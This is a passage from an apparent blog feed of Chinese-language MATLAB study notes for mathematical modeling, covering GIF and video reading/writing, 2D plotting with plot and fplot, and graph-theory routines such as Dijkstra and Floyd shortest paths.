<span class="hljs-comment">% Specify the output file name</span><br><span class="hljs-keyword">for</span> idx = <span class="hljs-number">1</span>:nImages<br>    [A,map] = rgb2ind(im&#123;idx&#125;,<span class="hljs-number">256</span>);<br>    <span class="hljs-keyword">if</span> idx == <span class="hljs-number">1</span><br>        imwrite(A,map,filename,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;LoopCount&#x27;</span>,Inf,<span class="hljs-string">&#x27;DelayTime&#x27;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">else</span><br>        imwrite(A,map,filename,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;WriteMode&#x27;</span>,<span class="hljs-string">&#x27;append&#x27;</span>,<span class="hljs-string">&#x27;DelayTime&#x27;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">%imwrite 将 GIF 文件写入您的当前文件夹。参数 &#x27;LoopCount&#x27;,Inf 使动画连续循环。&#x27;DelayTime&#x27;,1 在每个动画图像显示之间指定了一秒的时滞。</span><br></code></pre></div></td></tr></table></figure><h2 id="三-视频"><a href="#三-视频" class="headerlink" title="三.视频"></a>三.视频</h2><h3 id="3-1-读入"><a href="#3-1-读入" class="headerlink" title="3.1 读入"></a>3.1 读入</h3><blockquote><ol><li>创建 VideoReader 对象并读取视频</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">v = VideoReader(<span class="hljs-string">&#x27;xylophone.mp4&#x27;</span>);<br><span class="hljs-comment">% 读取视频中的所有帧，一次一帧。</span><br><span class="hljs-keyword">while</span> hasFrame(v)<br>    frame = readFrame(v);<br><span class="hljs-keyword">end</span><br><span class="hljs-comment">% 显示 readFrame 返回的最后一帧的相关信息。</span><br>whos frame<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>从特定时间开始读取视频帧</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 创建一个视频读取器对象，并从特定时间开始读取视频帧。</span><br>v = VideoReader(<span class="hljs-string">&#x27;xylophone.mp4&#x27;</span>);<br><span class="hljs-comment">% 指定在距视频开头 2.5 秒的位置开始读取。</span><br>v.CurrentTime = <span class="hljs-number">2.5</span>;<br><span class="hljs-comment">% 创建一个坐标区对象以显示帧。然后，继续读取和显示视频帧，直到没有可供读取的帧为止。</span><br>currAxes = axes;<br><span class="hljs-keyword">while</span> hasFrame(v)<br>    vidFrame = readFrame(v);<br>    image(vidFrame, <span class="hljs-string">&#x27;Parent&#x27;</span>, currAxes);<br>    currAxes.Visible = <span class="hljs-string">&#x27;off&#x27;</span>;<br>    pause(<span class="hljs-number">1</span>/v.FrameRate);<br><span class="hljs-keyword">end</span><br><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>使用帧索引读取视频帧</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">v = VideoReader(<span class="hljs-string">&#x27;xylophone.mp4&#x27;</span>);<br>frame = read(v,<span class="hljs-number">1</span>); <span class="hljs-comment">% 只读取第一个视频帧。</span><br>frame = read(v,Inf); <span class="hljs-comment">% 只读取最后一个视频帧。</span><br>frames = read(v,[<span class="hljs-number">5</span> <span class="hljs-number">10</span>]); <span class="hljs-comment">% 读取第 5 帧到第 10 帧。</span><br>frames = read(v,[<span class="hljs-number">50</span> Inf]); <span class="hljs-comment">% 从第 50 帧开始读取到视频文件结束。</span><br><br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>使用帧索引和时间交替读取视频</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">vidObj = VideoReader(<span class="hljs-string">&#x27;xylophone.mp4&#x27;</span>);<br>vidObj.CurrentTime<br><br><span class="hljs-comment">% 通过指定帧索引从视频中读取第 20 帧。然后显示 CurrentTime 属性的值。read 方法会自动更新 CurrentTime 属性，以反映已读到第 20 帧。在此步骤，调用 readFrame 函数将返回第 21 帧。</span><br>frame20 = read(vidObj,<span class="hljs-number">20</span>);<br>vidObj.CurrentTime<br><br><span class="hljs-comment">% 使用 readFrame 方法读取视频的其余帧。readFrame 方法返回对应于 CurrentTime 属性中时间的帧。例如，以下代码读取并显示从第 21 帧开始的帧，并持续到没有更多帧可读取为止</span><br><span class="hljs-keyword">while</span>(hasFrame(vidObj))<br>    frame = readFrame(vidObj);<br>    imshow(frame);<br>    title(sprintf(<span class="hljs-string">&#x27;Current Time = %.3f sec&#x27;</span>, vidObj.CurrentTime));<br>    pause(<span class="hljs-number">2</span>/vidObj.FrameRate);<br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure><h3 id="3-2-读出"><a href="#3-2-读出" class="headerlink" title="3.2 读出"></a>3.2 读出</h3><blockquote><ol><li>创建 VideoWriter 对象并写入视频</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 创建一个随机数据数组，为输出文件创建 VideoWriter 对象，然后将该数组写入视频。</span><br>A = <span class="hljs-built_in">rand</span>(<span class="hljs-number">300</span>);<br><span class="hljs-comment">% 创建一个 VideoWriter 对象以写入名为 newfile.avi 的 Motion JPEG AVI 文件，然后打开该文件以进行写入。</span><br>v = VideoWriter(<span class="hljs-string">&#x27;newfile.avi&#x27;</span>);<br>open(v) <br>writeVideo(v,A) <span class="hljs-comment">% 将数据矩阵 A 写入视频文件。</span><br>close(v) <span class="hljs-comment">% 关闭文件。</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>为未压缩的 AVI 指定描述文件并写入视频</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 使用指定的描述文件创建一个视频对象，创建包含一个 RGB 图像的数组，然后将该数组写入视频文件。</span><br>v = VideoWriter(<span class="hljs-string">&#x27;newfile.avi&#x27;</span>,<span class="hljs-string">&#x27;Uncompressed AVI&#x27;</span>);<br>open(v)<br><span class="hljs-comment">% 创建一个包含来自示例静态图像 peppers.png 的数据的数组。将 A 中的图像写入视频文件。</span><br>A = imread(<span class="hljs-string">&#x27;peppers.png&#x27;</span>);<br>writeVideo(v,A)<br>close(v)<br><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>从动画创建 AVI 文件</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 按以下步骤将一组帧写入压缩的 AVI 文件：生成一组帧，为要写入的文件创建视频对象，然后将帧写入视频文件。设置坐标区和图窗属性，以生成视频帧。</span><br>Z = peaks;<br>surf(Z); <br>axis tight manual <br>set(gca,<span class="hljs-string">&#x27;nextplot&#x27;</span>,<span class="hljs-string">&#x27;replacechildren&#x27;</span>); <br><span class="hljs-comment">% 为输出视频文件创建 VideoWriter 对象并打开该对象以进行写入。</span><br>v = VideoWriter(<span class="hljs-string">&#x27;peaks.avi&#x27;</span>);<br>open(v);<br><span class="hljs-comment">% 生成一组帧，从图窗中获取帧，然后将每一帧写入文件。</span><br><span class="hljs-keyword">for</span> k = <span class="hljs-number">1</span>:<span class="hljs-number">20</span> <br>   surf(<span class="hljs-built_in">sin</span>(<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>*k/<span class="hljs-number">20</span>)*Z,Z)<br>   frame = getframe(gcf);<br>   writeVideo(v,frame);<br><span class="hljs-keyword">end</span><br><br>close(v);<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数学建模-Matlab学习笔记（六）</title>
    <link href="/2021/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%85%AD%EF%BC%89%E4%BA%8C%E7%BB%B4%E6%9B%B2%E7%BA%BF/"/>
    <url>/2021/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%85%AD%EF%BC%89%E4%BA%8C%E7%BB%B4%E6%9B%B2%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<p>MATLAB（矩阵实验室）是第四代高层次的编程语言和交互式环境数值计算，可视化和编程。由美国MathWorks公司开发的一种编程语言。用于算法开发、数据可视化、数据分析以及数值计算的高级技术计算语言和交互式环境，主要包括MATLAB和Simulink两大部分。拥有众多的内置命令和数学函数，可以帮助您在数学计算，绘图和执行数值计算方法。 </p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-二维曲线"><a href="#1-二维曲线" class="headerlink" title="1.二维曲线"></a>1.二维曲线</h2><h3 id="1-1-plot-函数"><a href="#1-1-plot-函数" class="headerlink" title="1.1 plot 函数"></a>1.1 plot 函数</h3><h4 id="1-1-1-基本用法"><a href="#1-1-1-基本用法" class="headerlink" title="1.1.1 基本用法"></a>1.1.1 基本用法</h4><blockquote><ol><li><code>plot(x,y)</code>：其中 x 和 y 分别用于存储 x 坐标和 y 坐标数据。</li></ol></blockquote><blockquote><ol start="2"><li><code>plot(x)</code>：当该值是向量时，以元素值为纵坐标，其值的下标为横坐标。</li></ol></blockquote><p>当 plot 函数的参数 x 是复数向量时，则分别以该向量元素的实部和虚部为横、纵坐标绘制出一条曲线。</p><h4 id="1-1-2-plot-x-y-函数参数的变化形式"><a href="#1-1-2-plot-x-y-函数参数的变化形式" class="headerlink" title="1.1.2 plot(x,y)函数参数的变化形式"></a>1.1.2 plot(x,y)函数参数的变化形式</h4><blockquote><ol><li>当 x 是向量，y 是矩阵时</li></ol></blockquote><ul><li><p>如果矩阵 y 的列数等于 x 的长度，则以向量 x 为横坐标，以 y 的每个行向量为纵坐标绘制曲线，曲线的条数等于 y 的行数。</p></li><li><p>如果矩阵 y 的行数等于 x 的长度，则以向量 x 为横坐标，以 y 的每个列向量为纵坐标绘制曲线，曲线的条数等于 y 的列数。</p></li></ul><blockquote><ol start="2"><li>当 x 、y 是同型矩阵时</li></ol></blockquote><p>以 x 、y 对应列元素为横、纵坐标分别绘制曲线，曲线条数等于矩阵的列数。</p><blockquote><ol start="3"><li>含多个输入参数的 plot 函数</li></ol></blockquote><p><code>plot(x1,y1,x2,y2,···,xn,yn)</code>：其中，每一向量对构成一组数据点的横、纵坐标，绘制一条曲线。</p><blockquote><ol start="4"><li>含选项的 plot 函数</li></ol></blockquote><p><code>plot(x,y,选项)</code>：其中，选项分为线型、颜色、数据点标记。</p><ul><li><p>线型：实线（ “ - “ ）、虚线 （ “ : “ ）、点画线（ “ -. “ ）、双画线（ “ – “ ）</p></li><li><p>颜色：红色（r）、绿色（g）、蓝色（b）、白色（w）、黑色（k），等。</p></li><li><p>数据点标记：星号（” * “）、圆圈（ “o” ）、方块（ “s” ）、五角星（ “p” ）、朝上三角符号（ “ ^ “ ），等。</p></li></ul><h3 id="1-2-fplot-函数"><a href="#1-2-fplot-函数" class="headerlink" title="1.2 fplot 函数"></a>1.2 fplot 函数</h3><h4 id="1-2-1-基本用法"><a href="#1-2-1-基本用法" class="headerlink" title="1.2.1 基本用法"></a>1.2.1 基本用法</h4><p><code>fplot(f,lims,选项)</code>：其中，f 代表一个函数，通常采用函数句柄的形式。lims 为 x 轴的取值范围，用二元向量 [xmin，xmax]描述，默认值为 [-5，5] 。选项定义与 plot 函数相同。</p><h4 id="1-2-2-双输入函数参数的用法"><a href="#1-2-2-双输入函数参数的用法" class="headerlink" title="1.2.2 双输入函数参数的用法"></a>1.2.2 双输入函数参数的用法</h4><p><code>fplot(funx，funy，tlims，选项)</code>：其中，funx、funy 代表函数，通常采用函数句柄的形式。tlims 为参数函数 funx 和 funy 的自变量的取值范围，用二元向量 [tmin，tmax] 描述。</p>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数学建模-Matlab学习笔记（十四）图论算法</title>
    <link href="/2021/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/"/>
    <url>/2021/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%8D%81%E5%9B%9B%EF%BC%89%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>MATLAB（矩阵实验室）是第四代高层次的编程语言和交互式环境数值计算，可视化和编程。由美国MathWorks公司开发的一种编程语言。用于算法开发、数据可视化、数据分析以及数值计算的高级技术计算语言和交互式环境，主要包括MATLAB和Simulink两大部分。拥有众多的内置命令和数学函数，可以帮助您在数学计算，绘图和执行数值计算方法。 </p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="一-可达矩阵算法"><a href="#一-可达矩阵算法" class="headerlink" title="一.可达矩阵算法"></a>一.可达矩阵算法</h2><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">p</span>=<span class="hljs-title">dgraf</span><span class="hljs-params">(A)</span></span><br>n=<span class="hljs-built_in">size</span>(A,<span class="hljs-number">1</span>);<br>p=A;<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">2</span>:n<br>p=p+A^<span class="hljs-built_in">i</span>;<br><span class="hljs-keyword">end</span><br>p(p~=<span class="hljs-number">0</span>)=<span class="hljs-number">1</span>;<br>p;<br></code></pre></div></td></tr></table></figure><h2 id="二-关联矩阵和临接矩阵互换算法"><a href="#二-关联矩阵和临接矩阵互换算法" class="headerlink" title="二.关联矩阵和临接矩阵互换算法"></a>二.关联矩阵和临接矩阵互换算法</h2><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">w</span>=<span class="hljs-title">incandadf</span><span class="hljs-params">(F,f)</span></span><br><span class="hljs-keyword">if</span> f==<span class="hljs-number">0</span><br>m=sum(sum(F))/<span class="hljs-number">2</span>;<br>n=<span class="hljs-built_in">size</span>(F,<span class="hljs-number">1</span>);<br>w=<span class="hljs-built_in">zeros</span>(n,m);<br>k=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:n<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span>=<span class="hljs-built_in">i</span>:n<br><span class="hljs-keyword">if</span> F(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)~=<span class="hljs-number">0</span><br>w(<span class="hljs-built_in">i</span>,k)=<span class="hljs-number">1</span>;<br>w(<span class="hljs-built_in">j</span>,k)=<span class="hljs-number">1</span>;<br>k=k+<span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">elseif</span> f==<span class="hljs-number">1</span><br>m=<span class="hljs-built_in">size</span>(F,<span class="hljs-number">2</span>);<br>n=<span class="hljs-built_in">size</span>(F,<span class="hljs-number">1</span>);<br>w=<span class="hljs-built_in">zeros</span>(n,n);<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:m<br>a=<span class="hljs-built_in">find</span>(F(:,<span class="hljs-built_in">i</span>)~=<span class="hljs-number">0</span>);<br>w(a(<span class="hljs-number">1</span>),a(<span class="hljs-number">2</span>))=<span class="hljs-number">1</span>;<br>w(a(<span class="hljs-number">2</span>),a(<span class="hljs-number">1</span>))=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">else</span><br>fprint(<span class="hljs-string">&#x27;please input the right value of f&#x27;</span>);<br><span class="hljs-keyword">end</span><br>w;<br></code></pre></div></td></tr></table></figure><h2 id="三-有向图关联矩阵和临接矩阵互换算法"><a href="#三-有向图关联矩阵和临接矩阵互换算法" class="headerlink" title="三.有向图关联矩阵和临接矩阵互换算法"></a>三.有向图关联矩阵和临接矩阵互换算法</h2><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">w</span>=<span class="hljs-title">mattransf</span><span class="hljs-params">(F,f)</span></span><br><span class="hljs-keyword">if</span> f==<span class="hljs-number">0</span><br>m=sum(sum(F));<br>n=<span class="hljs-built_in">size</span>(F,<span class="hljs-number">1</span>);<br>w=<span class="hljs-built_in">zeros</span>(n,m);<br>k=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:n<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span>=<span class="hljs-built_in">i</span>:n<br><span class="hljs-keyword">if</span> F(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)~=<span class="hljs-number">0</span><br>w(<span class="hljs-built_in">i</span>,k)=<span class="hljs-number">1</span>;<br>w(<span class="hljs-built_in">j</span>,k)=<span class="hljs-number">-1</span>;<br>k=k+<span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">elseif</span> f==<span class="hljs-number">1</span><br>m=<span class="hljs-built_in">size</span>(F,<span class="hljs-number">2</span>);<br>n=<span class="hljs-built_in">size</span>(F,<span class="hljs-number">1</span>);<br>w=<span class="hljs-built_in">zeros</span>(n,n);<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:m<br>a=<span class="hljs-built_in">find</span>(F(:,<span class="hljs-built_in">i</span>)~=<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> F(a(<span class="hljs-number">1</span>),<span class="hljs-built_in">i</span>)==<span class="hljs-number">1</span><br>w(a(<span class="hljs-number">1</span>),a(<span class="hljs-number">2</span>))=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>w(a(<span class="hljs-number">2</span>),a(<span class="hljs-number">1</span>))=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">else</span><br>fprint(<span class="hljs-string">&#x27;please input the right value of f&#x27;</span>);<br><span class="hljs-keyword">end</span><br>w;<br></code></pre></div></td></tr></table></figure><h2 id="四-最短路"><a href="#四-最短路" class="headerlink" title="四.最短路"></a>四.最短路</h2><h3 id="4-1-Dijkstra（两点间距离）"><a href="#4-1-Dijkstra（两点间距离）" class="headerlink" title="4.1 Dijkstra（两点间距离）"></a>4.1 Dijkstra（两点间距离）</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[l,z]</span>=<span class="hljs-title">Dijkstra</span><span class="hljs-params">(w)</span></span><br>n=<span class="hljs-built_in">size</span>(w,<span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:n<br>l(<span class="hljs-built_in">i</span>)=w(<span class="hljs-number">1</span>,<span class="hljs-built_in">i</span>);<br>z(<span class="hljs-built_in">i</span>)=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">end</span><br><span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">i</span>&lt;=n<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span>=<span class="hljs-number">1</span>:n<br><span class="hljs-keyword">if</span> l(<span class="hljs-built_in">i</span>)&gt;l(<span class="hljs-built_in">j</span>)+w(<span class="hljs-built_in">j</span>,<span class="hljs-built_in">i</span>)<br>l(<span class="hljs-built_in">i</span>)=l(<span class="hljs-built_in">j</span>)+w(<span class="hljs-built_in">j</span>,<span class="hljs-built_in">i</span>);<br>z(<span class="hljs-built_in">i</span>)=<span class="hljs-built_in">j</span><span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">j</span>&lt;<span class="hljs-built_in">i</span><br><span class="hljs-built_in">i</span>=<span class="hljs-built_in">j</span><span class="hljs-number">-1</span>;<br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-built_in">i</span>=<span class="hljs-built_in">i</span>+<span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-Floyd（任意两点间距离）"><a href="#4-2-Floyd（任意两点间距离）" class="headerlink" title="4.2 Floyd（任意两点间距离）"></a>4.2 Floyd（任意两点间距离）</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[d,r]</span>=<span class="hljs-title">floyd</span><span class="hljs-params">(a)</span></span><br>n=<span class="hljs-built_in">size</span>(a,<span class="hljs-number">1</span>);<br>d=a;<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:n<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span>=<span class="hljs-number">1</span>:n<br>r(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)=<span class="hljs-built_in">j</span>;<br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br>r;<br><span class="hljs-keyword">for</span> k=<span class="hljs-number">1</span>:n<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:n<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span>=<span class="hljs-number">1</span>:n<br><span class="hljs-keyword">if</span> d(<span class="hljs-built_in">i</span>,k)+d(k,<span class="hljs-built_in">j</span>)&lt;d(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)<br>d(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)=d(<span class="hljs-built_in">i</span>,k)+d(k,<span class="hljs-built_in">j</span>);<br>r(<span class="hljs-built_in">i</span>,<span class="hljs-built_in">j</span>)=r(<span class="hljs-built_in">i</span>,k);<br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数学建模-Matlab学习笔记（十五）基础常用函数</title>
    <link href="/2021/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%8D%81%E4%BA%94%EF%BC%89%E5%9F%BA%E7%A1%80%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <url>/2021/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%8D%81%E4%BA%94%EF%BC%89%E5%9F%BA%E7%A1%80%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
    
